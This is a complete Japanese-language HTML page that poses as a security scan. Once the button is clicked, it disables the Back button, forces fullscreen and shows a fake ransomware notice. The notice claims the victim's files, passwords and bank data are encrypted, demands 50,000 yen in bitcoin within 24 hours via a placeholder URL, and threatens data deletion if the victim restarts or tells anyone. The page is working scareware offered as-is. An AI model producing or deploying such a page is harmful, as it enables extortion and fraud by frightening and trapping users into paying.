<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>⚠️ セキュリティ警告</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 100px 30px;
    }
    #message {
      font-size: 22px;
      line-height: 2;
      white-space: pre-wrap;
      margin-top: 50px;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      background-color: red;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: darkred;
    }
  </style>
</head>
<body>
  <h1>スキャン中…</h1>
  <button onclick="showWarning()">スキャンを続行</button>
  <div id="message"></div>

  <script>
    // 戻る防止
    history.pushState(null, null, location.href);
    window.onpopstate = () => history.go(1);

    function showWarning() {
      document.documentElement.requestFullscreen();
      document.querySelector("button").style.display = "none";
      document.querySelector("h1").style.display = "none";

      const content = `
⚠️ 緊急警告：あなたのデバイスは深刻なセキュリティリスクに晒されています。

💀 システム全体が感染し、個人ファイル・パスワード・写真・銀行情報などが完全に暗号化されました。

🛑 復元を希望する場合、下記の指示に従ってください。

🪙 支払金額: 50,000円相当のビットコイン  
⏳ 支払い期限: 24時間以内（超過後、すべてのデータは完全削除されます）

📥 振込先:  
https://ransom.fake-btc-wallet.com

🔒 注意：自己判断による電源オフ、再起動、他人への相談は復元を不可能にし、ファイルが即座に破壊されます。

復号キーを取得するまで、あなたのデバイスは完全に監視・制限されています。
      `;

      document.getElementById("message").innerText = content;
    }
  </script>
</body>
</html>
